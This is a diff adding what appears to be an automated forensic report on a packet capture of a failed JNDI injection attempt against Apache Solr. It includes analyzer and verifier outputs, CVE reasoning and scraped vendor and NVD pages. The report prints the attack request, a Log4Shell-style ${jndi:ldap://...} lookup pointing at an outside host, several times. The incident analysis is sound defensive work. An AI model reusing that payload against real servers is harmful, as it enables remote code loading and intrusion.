@@ -1,0 +1,319 @@
+=== MAFRA MCP FORENSIC REPORT ===
+
+PCAP File: incident.pcap
+
+=== FLOW SUMMARY ===
+=== PCAP Analysis Report ===
+File: incident.pcap
+Processing Status: Valid
+Total TCP Streams: 1
+TCP Stream IDs: 0
+Protocol Counts: ICMPv6=2, ARP=2, TCP=8, HTTP=1, DNS=8, HTTP/JSON=1
+
+Connections Overview:
+================================================================================
+TCP Conversations
+Filter:<No Filter>
+                                                           |       <-      | |       ->      | |     Total     |    Relative    |   Duration   |
+                                                           | Frames  Bytes | | Frames  Bytes | | Frames  Bytes |      Start     |              |
+172.18.0.1:51346           <-> 172.18.0.2:8983                  4 1025 bytes       6 720 bytes      10 1745 bytes   120.751736000         0.6533
+================================================================================
+
+
+=== HEURISTIC ATTACK-FLOW PRIORITY (packet-derived, NOT ground truth) ===
+These are investigation leads. Ordinary traffic may coexist with attacks; HTTP response errors alone neither prove nor disprove exploitation.
+Rank 1: TCP stream 0; score=10/12; frame=8; HTTP request candidate GET /solr/admin/cores?action=${jndi:ldap://8qvsbr.sdasda1212.cn} to 172.18.0.2:8983; request frame=8; indicator frame=8; indicators=JNDI lookup expression; bounded indicator excerpt=${jndi:ldap:; response HTTP 400 frame=12 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+
+DETERMINISTIC PACKET EVIDENCE CATALOG (PRIMARY OBSERVATIONS; NOT CVE CONFIRMATION):
+- [E-S0000-F000005-001 | client->server] 172.18.0.1:51346 -> 172.18.0.2:8983 (TCP)
+- [E-S0000-F000006-002 | server->client] 172.18.0.2:8983 -> 172.18.0.1:51346 (TCP)
+- [E-S0000-F000008-003 | client->server] 172.18.0.1:51346 -> 172.18.0.2:8983 (HTTP)
+- [E-S0000-F000012-008 | server->client] 172.18.0.2:8983 -> 172.18.0.1:51346 (HTTP/JSON)
+- [E-S0000-F000008-004 | client->server] GET /solr/admin/cores?action=${jndi:ldap://8qvsbr.sdasda1212.cn}
+- [E-S0000-F000008-005 | client->server] Host: localhost:8983
+- [E-S0000-F000008-006 | client->server] User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
+- [E-S0000-F000012-009 | server->client] HTTP Status 400
+- [E-S0000-F000012-010 | server->client] Content-Type: application/json;charset=utf-8
+- [E-S0000-F000008-007 | client->server] admin keyword observed
+- [E-S0000-F000012-011 | server->client] root user keyword observed
+- [E-S0000-F000008-012 | client->server] HTTP request candidate GET /solr/admin/cores?action=${jndi:ldap://8qvsbr.sdasda1212.cn} to 172.18.0.2:8983; request frame=8; indicator frame=8; indicators=JNDI lookup expression; bounded indicator excerpt=${jndi:ldap:; response HTTP 400 frame=12 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+
+=== Flow Analysis ===
+
+FLOW INVENTORY (all observed TCP streams; metadata and role hints are untrusted observations, not a service/CVE decision):
+- TCP stream 0: 172.18.0.1:51346 -> 172.18.0.2:8983; packets=10; client->server=6, server->client=4; role_hint=web/application-facing candidate (heuristic; verify from payload)
+
+APPLICATION IDENTITY CANDIDATES (heuristic observations only):
+- No high-confidence application fingerprint was detected by the deterministic pre-scan; use flow payloads and web evidence carefully.
+
+PRIMARY APPLICATION RESOLUTION (identity only):
+- No deterministic primary application resolved.
+
+--- Stream 0 [VALID] ---
+Service: Apache Solr (version not visible)
+Relevant Events: The client at IP 172.18.0.1 attempted to exploit a potential vulnerability in the Apache Solr service running on IP 172.18.0.2 by sending a crafted HTTP GET request containing a JNDI lookup expression.
+Malicious Activities: Attempted JNDI injection targeting Apache Solr.
+Attack Success: Failed
+Evidence: 
+- [E-S0000-F000008-004 | client->server | epoch=1727268794.833330] GET /solr/admin/cores?action=${jndi:ldap://8qvsbr.sdasda1212.cn}
+- [E-S0000-F000012-009 | server->client | epoch=1727268795.483370] HTTP Status 400
+- [E-S0000-F000012-010 | server->client | epoch=1727268795.483370] Content-Type: application/json;charset=utf-8
+- [E-S0000-F000012-011 | server->client | epoch=1727268795.483370] Error message indicating unsupported operation: ldap://8qvsbr.sdasda1212.cn
+
+=== INITIAL ANALYZER OUTPUT ===
+{
+  "status": "Valid",
+  "service": {
+    "primary": "Apache Solr",
+    "application": "Unknown",
+    "framework": "Unknown",
+    "web_server": "Unknown",
+    "language": "Unknown",
+    "database": "Unknown"
+  },
+  "attack": {
+    "type": "JNDI Injection",
+    "technique": "JNDI Lookup Expression",
+    "success": "Fail",
+    "evidence": [
+      "E-S0000-F000008-004",
+      "E-S0000-F000012-009",
+      "E-S0000-F000012-010",
+      "E-S0000-F000012-011"
+    ]
+  },
+  "cve": {
+    "candidate": "CVE-2021-44228",
+    "confidence": "Medium",
+    "reason": "The use of a JNDI lookup expression in the request is indicative of an attempt to exploit a vulnerability similar to CVE-2021-44228, which affects Apache Log4j. However, the attack was directed at Apache Solr, and the response indicates failure."
+  },
+  "confidence": "Medium"
+}
+
+=== REVISED ANALYZER OUTPUT ===
+{
+  "status": "Valid",
+  "service": {
+    "primary": "Apache Solr",
+    "application": "Unknown",
+    "framework": "Unknown",
+    "web_server": "Unknown",
+    "language": "Unknown",
+    "database": "Unknown"
+  },
+  "attack": {
+    "type": "JNDI Injection",
+    "technique": "JNDI Lookup Expression",
+    "success": "Fail",
+    "evidence": [
+      "E-S0000-F000008-004",
+      "E-S0000-F000012-009",
+      "E-S0000-F000012-010",
+      "E-S0000-F000012-011"
+    ]
+  },
+  "cve": {
+    "candidate": "Not Found",
+    "confidence": "Unknown",
+    "reason": "The observed JNDI injection attempt in the packet evidence does not match any specific CVE associated with Apache Solr. The attack was unsuccessful, as indicated by the HTTP 400 response. No CVE from the retrieved research directly correlates with the packet mechanism observed."
+  },
+  "confidence": "Medium"
+}
+
+=== VERIFIER OUTPUT ===
+{
+  "status": "Valid",
+  "verification_result": "Supported",
+  "service_supported": "Yes",
+  "attack_supported": "Yes",
+  "success_supported": "Yes",
+  "cve_supported": "Not Applicable",
+  "unsupported_claims": [],
+  "evidence_check": [
+    "E-S0000-F000008-004",
+    "E-S0000-F000012-009",
+    "E-S0000-F000012-010",
+    "E-S0000-F000012-011"
+  ],
+  "confidence": "Medium"
+}
+
+=== CONSENSUS SUMMARY ===
+Service: Apache Solr
+Attack Type: JNDI Injection
+Attack Success: Fail
+CVE: Not Found
+Verification Result: Supported
+Service Supported: Yes
+Attack Supported: Yes
+Success Supported: Yes
+CVE Supported: Not Applicable
+Verifier Confidence: Medium
+Overall Confidence: High
+Score: 4/4
+
+=== MCP ONLINE EVIDENCE SEARCH ===
+Status: Valid
+Query: Apache Solr JNDI Injection endpoint solr cores packet clues: endpoint solr cores
+Tool: search_forensic_evidence
+Retrieved At UTC: 2026-10-26T01:44:27.836489+00:00
+Candidate CVEs: CVE-2026-22444
+Sources: 5
+
+Source 1: NIST NVD
+Title: CVE-2026-22444: NVD vulnerability record
+URL: https://nvd.nist.gov/vuln/detail/CVE-2026-22444
+Summary: The "create core" API of Apache Solr 8.6 through 9.10.0 lacks sufficient input validation on some API parameters, which can cause Solr to check the existence of and attempt to read file-system paths that should be disallowed by Solr's  "allowPaths" security setting https://https://solr.apache.org/guide/solr/latest/configuration-guide/configuring-solr-xml.html#the-solr-element .  These read-only accesses can allow users to create cores using unexpected configsets if any are accessible via the filesystem.  On Windows systems configured to allow UNC paths this can additionally cause disclosure of NTLM "user" hashes. 
+
+Solr deployments are subject to this vulnerability if they meet the following criteria:
+  *  Solr is running in its "standalone" mode.
+  *  Solr's "allowPath" setting is being used to restrict file access to certain directories.
+  *  Solr's "create core" API is exposed and accessible to untrusted users.  This can happen if Solr's  RuleBasedAuthorizationPlugin https://solr.apache.org/guide/solr/latest/deployment-guide/rule-based-authorization-plugin.html  is disabled, or if it is enabled but the "core-admin-edit" predefined permission (or an equivalent custom permission) is given to low-trust (i.e. non-admin) user roles.
+
+Users can mitigate this by enabling Solr's RuleBasedAuthorizationPlugin (if disabled) and configuring a permission-list that prevents untrusted users from creating new Solr cores.  Users should also upgrade to Apache Solr 9.10.1 or greater, which contain fixes for this issue.
+Supports: NVD lists CVE-2026-22444 as a research lead; product identity, version applicability, and exploitation remain unverified.
+Contradicts: None
+
+Source 2: Official vendor webpage
+Title: Solr News - Apache Solr
+URL: https://solr.apache.org/news.html
+Summary: UNTRUSTED WEB RESEARCH (not PCAP evidence). Solr's "allowPath" setting is being used to restrict file access to certain directories. Solr's "create core" API is exposed and accessible to ... | Webpage text: [PARTIAL WEBPAGE: only first 150000 bytes examined] You may also read these news as ATOM feeds: Announcements, Security Announcements.. 4 October 2026, Apache Solr™ 9.11.0 available The Solr PMC is pleased to announce the release of Apache Solr 9.11.0. Solr is the blazing-fast, open source, multi-modal search platform built on Apache Lucene. It powers full-text, vector, analytics, and geospatial search at many of the world's largest organizations. Other major features include Kubernetes and docker integration, streaming, highlighting, faceting, and spellchecking. Solr 9.11.0 is available for immediate download at: https://solr.apache.org/downloads.html Solr 9.11.0 Release Highlights:¶ Added new range field types — IntRangeField, LongRangeField, FloatRangeField, and DoubleRangeField — for storing and querying numeric ranges, plus an experimental numericRange query parser. Extended nested/block document support: the parent and child query parsers gained a parentPath local parameter (childPath also added) that automatically derives the correct filter from document nesting, so queries no longer need to reference the internal nest path field directly. Also added a root-document query shortcut for nested document queries. Index sorting now works correctly with nested documents. Added hybrid search based on reciprocal rank fusion (RRF) via a new combined query search handler, merging multiple query strategies into one ranked result set. Also supports result collapsing and query elevation. Added support for multiple dense vectors per document (nested vectors), enabling multi-valued vector search. Added MergeOnFlushMergePolicy, merging small segments together at commit, reducing segments to search. Added ContentHashVersionProcessor, an update processor avoiding index churn when re-adding documents with identical content. Expanded streaming expression rollup with new metrics: missing-value counts, count-distinct, percentile, standard deviation. Added support for stored fields in Export Writer output, not just docValues. Added an UPGRADECOREINDEX core admin action to upgrade an index format in place without reindexing. The Luke handler now aggregates results across all shards by default. Improved multiThreaded=true query performance when a docset is needed, such as faceting. JWT authentication's blockUnknown setting now defaults to true, blocking unauthenticated requests by default; it previously defaulted to false despite documentation stating otherwise. Deployments relying on pass-through authentication must now explicitly set blockUnknown to false. Added an allowZkHosts setting to restrict which ZooKeeper connection strings a cross-collection join or streaming expression may target. The local SolrCloud ensemble is always allowed. Removed LocalTikaExtractionBackend from the extraction module (SolrCell); extracting content via a remote Tika Server is now the only option. And more features/improvements. Please refer to the Upgrade Notes in the Solr Ref Guide for information on upgrading from previous Solr versions: https://solr.apache.org/guide/solr/9_11/upgrade-notes/solr-upgrade-notes.html Please read CHANGELOG.md for a full list of new features, changes and bugfixes: https://solr.apache
+Supports: None
+Contradicts: None
+
+Source 3: Official vendor webpage
+Title: Apache Solr VEX
+URL: https://solr.apache.org/vex.html
+Summary: UNTRUSTED WEB RESEARCH (not PCAP evidence). CVE-2026-34478, Apache Log4j Core: Log injection via CRLF sequences in Rfc5424Layout. Published: 2026-04-10. Status: not_affected. Affected Solr versions: 9.10. | Webpage text: [PARTIAL WEBPAGE: only first 150000 bytes examined] ← Back to the dependency CVE table CVE-2026-64607 (medium severity) is a connection-leak bug in Apache HttpComponents Client's classic (blocking) I/O model: if a response has an invalid or unsupported Content-Encoding header, the client fails to release the underlying connection back to the connection manager, eventually exhausting the pool and causing a denial of service. It does not affect HttpClient's async I/O model. It affects httpclient5 from 5.0-alpha1 through 5.6.2; fixed in 5.6.3. Solr is not affected. httpclient5 (along with httpcore5 and httpcore5-h2, covered in separate VEX entries for their own CVEs) is bundled transitively by org.apache.calcite.avatica:avatica-core, which uses it to support Avatica's optional remote-JDBC transport -- connecting to a remote Avatica server over HTTP. Solr's own /sql handler (CalciteSolrDriver) only ever opens a local, in-process org.apache.calcite.jdbc.CalciteConnection; there is no org.apache.hc.client5/org.apache.hc.core5 usage anywhere in solr/modules/sql's source, and Solr never acts as an Avatica HTTP client or server. The dependency has in fact been marked permitUnusedDeclared in Solr's own build since at least the 10.0.0 release, confirming the build's own dependency-analysis tooling already recognized it as present-but-unused. It's also shipped only via the optional solr:modules:sql module -- every other place it appears (solrj-streaming, solr-ref-guide, webapp) is test-scope only, not shipped. Solr has shipped an affected httpclient5 since at least 9.1.0 (through 10.0.0, and continuing on branch_10x/main at 5.5). branch_9x has since moved to 5.6.4, past the fix -- picked up incidentally via routine dependency maintenance, not a targeted fix for this CVE. Since the code path is unreachable regardless, no fix is required on branch_10x/main either. CVE: CVE-2026-64607 CVE-2026-54428 is an allocation-without-limits issue in Apache HttpComponents Core's HTTP/2 HPACK decoder: before an HTTP/2 peer's SETTINGS frame is acknowledged, the configured header list size limit isn't yet applied, so a remote peer can send oversized compressed header blocks and exhaust memory, causing a denial of service. It affects httpcore5-h2 5.4.2 and earlier (and 5.5-beta1 and earlier); fixed in 5.4.3. Solr is not affected. httpcore5-h2 is bundled transitively by org.apache.calcite.avatica:avatica-core, which uses it to support Avatica's optional remote-JDBC HTTP/2 transport -- see the companion VEX entry for CVE-2026-64607 (httpclient5) for the full reachability analysis, which applies identically here: Solr's /sql handler never uses Avatica's remote HTTP transport, only the local embedded CalciteConnection, so the HPACK decoder this CVE concerns -- which only runs when HttpComponents is actually acting as an HTTP/2 endpoint -- is never invoked. The dependency is permitUnusedDeclared in Solr's own build and shipped only via the optional solr:modules:sql module. Solr has shipped an affected httpcore5-h2 since at least 9.1.0 (through 10.0.0, and continuing on branch_10x/main at 5.3.4). branch_9x has since moved to 5.4.3, exactly the fix version -- picked up incidentally via routine depende
+Supports: None
+Contradicts: None
+
+Source 4: Serper web result
+Title: Apache Solr Injection Research
+URL: https://github.com/veracode-research/solr-injection
+Summary: UNTRUSTED WEB RESEARCH (not PCAP evidence). This research is aimed to present a new vulnerability: "Solr parameter Injection" and describe how it may be exploited in different scenarios. | Webpage text: [PARTIAL WEBPAGE: only first 150000 bytes examined] You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session.
+Supports: None
+Contradicts: None
+
+Source 5: Official vendor webpage
+Title: Core Discovery :: Apache Solr Reference Guide
+URL: https://solr.apache.org/guide/solr/latest/configuration-guide/core-discovery.html
+Summary: UNTRUSTED WEB RESEARCH (not PCAP evidence). You can create new Solr cores on the fly, shutdown cores, even replace one running core with another, all without ever stopping or restarting Solr. Your core. | Webpage text: Archived Solr Reference Guides Core discovery means that creating a core is as simple as a core.properties file located on disk. In Solr, the term core is used to refer to a single index and associated transaction log and configuration files (including the solrconfig.xml and schema files, among others). Your Solr installation can have multiple cores if needed, which allows you to index data with different structures in the same server, and maintain control over how your data is presented to different audiences. In SolrCloud mode you will be more familiar with the term collection. Behind the scenes a collection consists of one or more cores. Cores can be created using bin/solr script or as part of SolrCloud collection creation using the APIs. Core-specific properties (such as the directories to use for the indexes or configuration files, the core name, and other options) are defined in a core.properties file. Any core.properties file in any directory of your Solr installation (or in a directory under where solr_home is defined) will be found by Solr and the defined properties will be used for the core named in the file. The core.properties file is a simple Java Properties file where each line is just a key=value pair, e.g., name=core1. Notice that no quotes are required. A minimal core.properties file looks like the example below. However, it can also be empty, see information on placement of core.properties below. Placement of core.properties Solr cores are configured by placing a file named core.properties in a sub-directory under solr.home. There are no a-priori limits to the depth of the tree, nor are there limits to the number of cores that can be defined. Cores may be anywhere in the tree with the exception that cores may not be defined under an existing core. That is, the following is not allowed: ./cores/core1/core.properties ./cores/core1/coremore/core5/core.properties In this example, the enumeration will stop at "core1". ./cores/somecores/core1/core.properties ./cores/somecores/core2/core.properties ./cores/othercores/core3/core.properties ./cores/extracores/deepertree/core4/core.properties It is possible to segment Solr into multiple cores, each with its own configuration and indices. Cores may be dedicated to a single application or to very different ones, but all are administered through a common administration interface. You can create new Solr cores on the fly, shutdown cores, even replace one running core with another, all without ever stopping or restarting Solr. Your core.properties file can be empty if necessary. Suppose core.properties is located in ./cores/core1 (relative to solr_home) but is empty. In this case, the core name is assumed to be "core1". The instanceDir will be the folder containing core.properties (i.e., ./cores/core1). The dataDir will be ../cores/core1/data, etc. You can run Solr without configuring any cores. Defining core.properties Files The minimal core.properties file is an empty file, in which case all of the properties are defaulted appropriately. Java properties files allow the hash (#) or bang (!) characters to specify comment-to-end-of-line. The following properties are available: The name of the SolrCore. You’ll use t
+Supports: None
+Contradicts: None
+
+=== CVE MECHANISM CANDIDATES (NOT CONFIRMED CVEs) ===
+No sufficiently discriminating mechanism match from available sources and packet observations.
+Do NOT equate this ranking with verified CVE exploitation or exact CVE attribution.
+
+=== FORMATTED EVIDENCE ===
+=== PRIMARY PCAP EVIDENCE ===
+- PCAP [E-S0000-F000008-004]: GET /solr/admin/cores?action=${jndi:ldap://8qvsbr.sdasda1212.cn}.
+- PCAP [E-S0000-F000012-009]: HTTP Status 400.
+- PCAP [E-S0000-F000012-010]: Content-Type: application/json;charset=utf-8.
+- PCAP [E-S0000-F000012-011]: root user keyword observed.
+
+=== EXTERNAL ONLINE SUPPORTING EVIDENCE ===
+- ONLINE RESEARCH LEAD [NIST NVD] CVE-2026-22444: NVD vulnerability record: The "create core" API of Apache Solr 8.6 through 9.10.0 lacks sufficient input validation on some API parameters, which can cause Solr to check the existence of and attempt to read file-system paths that should be disallowed by Solr's  "allowPaths" security setting https://https://solr.apache.org/guide/solr/latest/configuration-guide/configuring-solr-xml.html#the-solr-element .  These read-only accesses can allow users to create cores using unexpected configsets if any are accessible via the filesystem.  On Windows systems configured to allow UNC paths this can additionally cause disclosure of NTLM "user" hashes. 
+
+Solr deployments are subject to this vulnerability if they meet the following criteria:
+  *  Solr is running in its "standalone" mode.
+  *  Solr's "allowPath" setting is being used to restrict file access to certain directories.
+  *  Solr's "create core" API is exposed and accessible to untrusted users.  This can happen if Solr's  RuleBasedAuthorizationPlugin https://solr.apache.org/guide/solr/latest/deployment-guide/rule-based-authorization-plugin.html  is disabled, or if it is enabled but the "core-admin-edit" predefined permission (or an equivalent custom permission) is given to low-trust (i.e. non-admin) user roles.
+
+Users can mitigate this by enabling Solr's RuleBasedAuthorizationPlugin (if disabled) and configuring a permission-list that prevents untrusted users from creating new Solr cores.  Users should also upgrade to Apache Solr 9.10.1 or greater, which contain fixes for this issue. Source: https://nvd.nist.gov/vuln/detail/CVE-2026-22444 Supports: NVD lists CVE-2026-22444 as a research lead; product identity, version applicability, and exploitation remain unverified.
+- ONLINE [Official vendor webpage] Solr News - Apache Solr: UNTRUSTED WEB RESEARCH (not PCAP evidence). Solr's "allowPath" setting is being used to restrict file access to certain directories. Solr's "create core" API is exposed and accessible to ... | Webpage text: [PARTIAL WEBPAGE: only first 150000 bytes examined] You may also read these news as ATOM feeds: Announcements, Security Announcements.. 4 October 2026, Apache Solr™ 9.11.0 available The Solr PMC is pleased to announce the release of Apache Solr 9.11.0. Solr is the blazing-fast, open source, multi-modal search platform built on Apache Lucene. It powers full-text, vector, analytics, and geospatial search at many of the world's largest organizations. Other major features include Kubernetes and docker integration, streaming, highlighting, faceting, and spellchecking. Solr 9.11.0 is available for immediate download at: https://solr.apache.org/downloads.html Solr 9.11.0 Release Highlights:¶ Added new range field types — IntRangeField, LongRangeField, FloatRangeField, and DoubleRangeField — for storing and querying numeric ranges, plus an experimental numericRange query parser. Extended nested/block document support: the parent and child query parsers gained a parentPath local parameter (childPath also added) that automatically derives the correct filter from document nesting, so queries no longer need to reference the internal nest path field directly. Also added a root-document query shortcut for nested document queries. Index sorting now works correctly with nested documents. Added hybrid search based on reciprocal rank fusion (RRF) via a new combined query search handler, merging multiple query strategies into one ranked result set. Also supports result collapsing and query elevation. Added support for multiple dense vectors per document (nested vectors), enabling multi-valued vector search. Added MergeOnFlushMergePolicy, merging small segments together at commit, reducing segments to search. Added ContentHashVersionProcessor, an update processor avoiding index churn when re-adding documents with identical content. Expanded streaming expression rollup with new metrics: missing-value counts, count-distinct, percentile, standard deviation. Added support for stored fields in Export Writer output, not just docValues. Added an UPGRADECOREINDEX core admin action to upgrade an index format in place without reindexing. The Luke handler now aggregates results across all shards by default. Improved multiThreaded=true query performance when a docset is needed, such as faceting. JWT authentication's blockUnknown setting now defaults to true, blocking unauthenticated requests by default; it previously defaulted to false despite documentation stating otherwise. Deployments relying on pass-through authentication must now explicitly set blockUnknown to false. Added an allowZkHosts setting to restrict which ZooKeeper connection strings a cross-collection join or streaming expression may target. The local SolrCloud ensemble is always allowed. Removed LocalTikaExtractionBackend from the extraction module (SolrCell); extracting content via a remote Tika Server is now the only option. And more features/improvements. Please refer to the Upgrade Notes in the Solr Ref Guide for information on upgrading from previous Solr versions: https://solr.apache.org/guide/solr/9_11/upgrade-notes/solr-upgrade-notes.html Please read CHANGELOG.md for a full list of new features, changes and bugfixes: https://solr.apache Source: https://solr.apache.org/news.html
+- ONLINE RESEARCH LEAD [Official vendor webpage] Apache Solr VEX: UNTRUSTED WEB RESEARCH (not PCAP evidence). CVE-2026-34478, Apache Log4j Core: Log injection via CRLF sequences in Rfc5424Layout. Published: 2026-04-10. Status: not_affected. Affected Solr versions: 9.10. | Webpage text: [PARTIAL WEBPAGE: only first 150000 bytes examined] ← Back to the dependency CVE table CVE-2026-64607 (medium severity) is a connection-leak bug in Apache HttpComponents Client's classic (blocking) I/O model: if a response has an invalid or unsupported Content-Encoding header, the client fails to release the underlying connection back to the connection manager, eventually exhausting the pool and causing a denial of service. It does not affect HttpClient's async I/O model. It affects httpclient5 from 5.0-alpha1 through 5.6.2; fixed in 5.6.3. Solr is not affected. httpclient5 (along with httpcore5 and httpcore5-h2, covered in separate VEX entries for their own CVEs) is bundled transitively by org.apache.calcite.avatica:avatica-core, which uses it to support Avatica's optional remote-JDBC transport -- connecting to a remote Avatica server over HTTP. Solr's own /sql handler (CalciteSolrDriver) only ever opens a local, in-process org.apache.calcite.jdbc.CalciteConnection; there is no org.apache.hc.client5/org.apache.hc.core5 usage anywhere in solr/modules/sql's source, and Solr never acts as an Avatica HTTP client or server. The dependency has in fact been marked permitUnusedDeclared in Solr's own build since at least the 10.0.0 release, confirming the build's own dependency-analysis tooling already recognized it as present-but-unused. It's also shipped only via the optional solr:modules:sql module -- every other place it appears (solrj-streaming, solr-ref-guide, webapp) is test-scope only, not shipped. Solr has shipped an affected httpclient5 since at least 9.1.0 (through 10.0.0, and continuing on branch_10x/main at 5.5). branch_9x has since moved to 5.6.4, past the fix -- picked up incidentally via routine dependency maintenance, not a targeted fix for this CVE. Since the code path is unreachable regardless, no fix is required on branch_10x/main either. CVE: CVE-2026-64607 CVE-2026-54428 is an allocation-without-limits issue in Apache HttpComponents Core's HTTP/2 HPACK decoder: before an HTTP/2 peer's SETTINGS frame is acknowledged, the configured header list size limit isn't yet applied, so a remote peer can send oversized compressed header blocks and exhaust memory, causing a denial of service. It affects httpcore5-h2 5.4.2 and earlier (and 5.5-beta1 and earlier); fixed in 5.4.3. Solr is not affected. httpcore5-h2 is bundled transitively by org.apache.calcite.avatica:avatica-core, which uses it to support Avatica's optional remote-JDBC HTTP/2 transport -- see the companion VEX entry for CVE-2026-64607 (httpclient5) for the full reachability analysis, which applies identically here: Solr's /sql handler never uses Avatica's remote HTTP transport, only the local embedded CalciteConnection, so the HPACK decoder this CVE concerns -- which only runs when HttpComponents is actually acting as an HTTP/2 endpoint -- is never invoked. The dependency is permitUnusedDeclared in Solr's own build and shipped only via the optional solr:modules:sql module. Solr has shipped an affected httpcore5-h2 since at least 9.1.0 (through 10.0.0, and continuing on branch_10x/main at 5.3.4). branch_9x has since moved to 5.4.3, exactly the fix version -- picked up incidentally via routine depende Source: https://solr.apache.org/vex.html
+- ONLINE [Serper web result] Apache Solr Injection Research: UNTRUSTED WEB RESEARCH (not PCAP evidence). This research is aimed to present a new vulnerability: "Solr parameter Injection" and describe how it may be exploited in different scenarios. | Webpage text: [PARTIAL WEBPAGE: only first 150000 bytes examined] You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Source: https://github.com/veracode-research/solr-injection
+- ONLINE [Official vendor webpage] Core Discovery :: Apache Solr Reference Guide: UNTRUSTED WEB RESEARCH (not PCAP evidence). You can create new Solr cores on the fly, shutdown cores, even replace one running core with another, all without ever stopping or restarting Solr. Your core. | Webpage text: Archived Solr Reference Guides Core discovery means that creating a core is as simple as a core.properties file located on disk. In Solr, the term core is used to refer to a single index and associated transaction log and configuration files (including the solrconfig.xml and schema files, among others). Your Solr installation can have multiple cores if needed, which allows you to index data with different structures in the same server, and maintain control over how your data is presented to different audiences. In SolrCloud mode you will be more familiar with the term collection. Behind the scenes a collection consists of one or more cores. Cores can be created using bin/solr script or as part of SolrCloud collection creation using the APIs. Core-specific properties (such as the directories to use for the indexes or configuration files, the core name, and other options) are defined in a core.properties file. Any core.properties file in any directory of your Solr installation (or in a directory under where solr_home is defined) will be found by Solr and the defined properties will be used for the core named in the file. The core.properties file is a simple Java Properties file where each line is just a key=value pair, e.g., name=core1. Notice that no quotes are required. A minimal core.properties file looks like the example below. However, it can also be empty, see information on placement of core.properties below. Placement of core.properties Solr cores are configured by placing a file named core.properties in a sub-directory under solr.home. There are no a-priori limits to the depth of the tree, nor are there limits to the number of cores that can be defined. Cores may be anywhere in the tree with the exception that cores may not be defined under an existing core. That is, the following is not allowed: ./cores/core1/core.properties ./cores/core1/coremore/core5/core.properties In this example, the enumeration will stop at "core1". ./cores/somecores/core1/core.properties ./cores/somecores/core2/core.properties ./cores/othercores/core3/core.properties ./cores/extracores/deepertree/core4/core.properties It is possible to segment Solr into multiple cores, each with its own configuration and indices. Cores may be dedicated to a single application or to very different ones, but all are administered through a common administration interface. You can create new Solr cores on the fly, shutdown cores, even replace one running core with another, all without ever stopping or restarting Solr. Your core.properties file can be empty if necessary. Suppose core.properties is located in ./cores/core1 (relative to solr_home) but is empty. In this case, the core name is assumed to be "core1". The instanceDir will be the folder containing core.properties (i.e., ./cores/core1). The dataDir will be ../cores/core1/data, etc. You can run Solr without configuring any cores. Defining core.properties Files The minimal core.properties file is an empty file, in which case all of the properties are defaulted appropriately. Java properties files allow the hash (#) or bang (!) characters to specify comment-to-end-of-line. The following properties are available: The name of the SolrCore. You’ll use t Source: https://solr.apache.org/guide/solr/latest/configuration-guide/core-discovery.html
+
+=== SOURCE URLS ===
+- https://nvd.nist.gov/vuln/detail/CVE-2026-22444
+- https://solr.apache.org/news.html
+- https://solr.apache.org/vex.html
+- https://github.com/veracode-research/solr-injection
+- https://solr.apache.org/guide/solr/latest/configuration-guide/core-discovery.html
+
+Search status: Valid
+Search query: Apache Solr JNDI Injection endpoint solr cores packet clues: endpoint solr cores
+Limitations:
+- Online sources are supporting context; packet evidence remains primary.
+- The Analyzer and Verifier findings were retained without rewriting.
+- 2 online CVE record(s) were retained as product-related research leads only; they were not used as the validated CVE.
+
+=== ANALYST-VERIFIER CVE STATUS (NO SEPARATE VALIDATOR) ===
+{
+  "status": "Valid",
+  "validated_cve": "Not Found",
+  "cve_supported": "No",
+  "confidence": "Low",
+  "reasons": [
+    "Analyst proposed Not Found; independent Verifier CVE support: Not Applicable. No separate online CVE validator was run."
+  ]
+}
+
+=== FINAL REPORT ===
+Affected Service: Apache Solr
+Associated CVE candidate (Analyst): Not Found
+Associated CVE mechanism match (binary): No
+Exact CVE applicability established: No
+Attack prediction confidence: High
+Attack outcome evidence-verified: Yes
+Identified CVE: Not Found
+Attack: Failed
+Is Service Vulnerable: Unknown
+Evidence:
+- PCAP [E-S0000-F000008-004]: GET /solr/admin/cores?action=${jndi:ldap://8qvsbr.sdasda1212.cn}.
+- PCAP [E-S0000-F000012-009]: HTTP Status 400.
+- PCAP [E-S0000-F000012-010]: Content-Type: application/json;charset=utf-8.
+- PCAP [E-S0000-F000012-011]: root user keyword observed.
+- ONLINE RESEARCH LEAD [NIST NVD] CVE-2026-22444: NVD vulnerability record: The "create core" API of Apache Solr 8.6 through 9.10.0 lacks sufficient input validation on some API parameters, which can cause Solr to check the existence of and attempt to read file-system paths that should be disallowed by Solr's  "allowPaths" security setting https://https://solr.apache.org/guide/solr/latest/configuration-guide/configuring-solr-xml.html#the-solr-element .  These read-only accesses can allow users to create cores using unexpected configsets if any are accessible via the filesystem.  On Windows systems configured to allow UNC paths this can additionally cause disclosure of NTLM "user" hashes. 
+
+Solr deployments are subject to this vulnerability if they meet the following criteria:
+  *  Solr is running in its "standalone" mode.
+  *  Solr's "allowPath" setting is being used to restrict file access to certain directories.
+  *  Solr's "create core" API is exposed and accessible to untrusted users.  This can happen if Solr's  RuleBasedAuthorizationPlugin https://solr.apache.org/guide/solr/latest/deployment-guide/rule-based-authorization-plugin.html  is disabled, or if it is enabled but the "core-admin-edit" predefined permission (or an equivalent custom permission) is given to low-trust (i.e. non-admin) user roles.
+
+Users can mitigate this by enabling Solr's RuleBasedAuthorizationPlugin (if disabled) and configuring a permission-list that prevents untrusted users from creating new Solr cores.  Users should also upgrade to Apache Solr 9.10.1 or greater, which contain fixes for this issue. Source: https://nvd.nist.gov/vuln/detail/CVE-2026-22444 Supports: NVD lists CVE-2026-22444 as a research lead; product identity, version applicability, and exploitation remain unverified.
